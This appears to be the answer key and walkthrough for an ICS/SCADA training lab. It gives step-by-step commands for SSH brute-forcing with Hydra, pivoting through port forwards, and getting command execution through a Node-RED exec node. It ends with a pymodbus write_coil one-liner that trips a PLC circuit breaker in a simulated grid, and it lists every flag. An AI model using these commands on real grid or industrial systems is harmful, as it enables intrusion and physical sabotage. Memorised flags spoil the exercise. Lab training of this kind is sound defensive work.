# Operation Blackout Zero - Comprehensive Solution Walkthrough

This document provides step-by-step instructions for completing all training levels in the **Operation Blackout Zero** Smart Grid Co-Simulation package.

---

## Phase 1: Corporate Foothold & IDMZ Infiltration

### Objective
Brute-force SSH credentials on the Industrial DMZ Jump Host `idmz-jump` (`10.0.50.50`) to pivot from the Corporate Kali machine (`10.0.100.50`).

### Step-by-Step Instructions
1. Open terminal on Kali (`attacker-host`).
2. Run Hydra SSH brute-force attack using dictionary `passlist.txt`:
   ```bash
   hydra -l operator -P /home/kali/passlist.txt ssh://10.0.50.50
   ```
   *Result*: Discovers credentials `operator` / `operator123`.

3. SSH into the jump host:
   ```bash
   ssh operator@10.0.50.50
   ```

4. Retrieve Flag 1:
   ```bash
   cat /home/operator/flag.txt
   ```
   **Flag**: `FLAG{IDMZ_JUMP_PIVOT_ESTABLISHED}`

---

## Phase 2: SCADA Control Room Discovery & HMI Pivoting

### Objective
Perform internal scanning from `idmz-jump` against SCADA subnet (`10.0.2.0/24`), discover Node-RED / Grafana endpoints on `scada-hmi` (`10.0.2.10`), and access the HMI via SSH local port forwarding.

### Step-by-Step Instructions
1. From `idmz-jump`, scan the SCADA subnet:
   ```bash
   nmap -p 1880,3000,8086 10.0.2.0/24
   ```
   *Result*: Ports `1880` (Node-RED) and `3000` (Grafana) open on `10.0.2.10`.

2. On Kali (`attacker-host`), establish SSH local port forwarding:
   ```bash
   ssh -L 1880:10.0.2.10:1880 -L 3000:10.0.2.10:3000 operator@10.0.50.50
   ```

3. Open a browser to `http://localhost:1880` (Node-RED) or execute `curl http://localhost:1880/flows` on Kali.

4. Retrieve Flag 2 via any of the following methods:
   - **Method A (Node-RED UI)**: View **Info (i)** tab in Node-RED sidebar for *"Smart Grid Substation HMI"*.
   - **Method B (Node-RED Exec RCE)**: Drag an `exec` node with `cat /root/flag.txt`.
   - **Method C (API endpoint)**: `curl -s http://localhost:1880/flows | grep -o 'FLAG{[^"]*}'`

   **Flag**: `FLAG{SCADA_HMI_MONITORING_COMPROMISED}`

### Accessing the Grafana Substation Telemetry Dashboard
1. Ensure your SSH local port forward tunnel is active: `ssh -L 3000:10.0.2.10:3000 operator@10.0.50.50`.
2. Open your Kali browser to `http://localhost:3000`.
3. Log in with `admin` / `admin` (or view as anonymous viewer).
4. Open **"Smart Grid Substation Monitoring Dashboard"** (`smartgrid_scada_v1`) to view live Bus 632 Voltage (240.0 V) and Feeder Circuit Breaker Status graphs.

---

## Phase 3: Substation OpenPLC Modbus Command Injection & Grid Sabotage

### Objective
Transmit Modbus TCP command injection payloads targeting `substation-plc1` (`10.0.3.10:502`) to trip the main feeder circuit breaker, causing physical grid collapse in GridLAB-D.

### Step-by-Step Execution Methods

#### Method A: Command Execution via Compromised SCADA HMI (Node-RED)
1. Open Node-RED flow editor at `http://localhost:1880`.
2. Drag an **`exec`** node onto the canvas and set the command to:
   ```bash
   python3 -c "from pymodbus.client import ModbusTcpClient; c = ModbusTcpClient('10.0.3.10', port=502); c.connect(); c.write_coil(0, False); c.close()"
   ```
3. Wire an **`inject`** node to the input of the `exec` node, deploy the flow, and click trigger.

#### Method B: SSH Tunneling / Port Forwarding through SCADA HMI
1. On Kali (`attacker-host`), establish SSH port forward to `substation-plc1`:
   ```bash
   ssh -L 5020:10.0.3.10:502 operator@10.0.50.50
   ```
2. Execute `modbus_attack.py` targeting local tunneled port `5020`:
   ```bash
   python3 /home/kali/modbus_attack.py --target 127.0.0.1 --port 5020 --action trip_breaker
   ```

### Physical Impact Verification & Flag Retrieval

1. **Physical Reaction**:
   - OpenPLC receives `write_coil(0, False)` Modbus instruction and sets Coil 0 (`CB_MAIN_CLOSED`) to `False`.
   - GridLAB-D bridge (`gridlabd_bridge.py`) registers the breaker trip, collapsing physical bus voltage to `0.0 V` and grid frequency to `0.00 Hz`.

2. **Retrieving Flag 3 (`FLAG{GRID_PHYSICAL_COLLAPSE_SUCCESSFUL}`)**:
   - **Method A (Modbus Telemetry Read)**: Run `python3 /home/kali/modbus_attack.py --target 127.0.0.1 --port 5020 --action read` on Kali to confirm `Circuit Breaker Closed: False`, `Bus 632 Voltage: 0.0 V`, and `Grid Frequency: 0.0 Hz`.
   - **Method B (Physics Bridge Log)**: Inspect `/var/log/gridlabd_bridge.log` on `10.0.4.10`.
   - **Method C (Grafana Dashboard)**: Open `http://localhost:3000` on Kali to visually confirm real-time voltage collapse to `0.0 V`.

   **Flag**: `FLAG{GRID_PHYSICAL_COLLAPSE_SUCCESSFUL}`
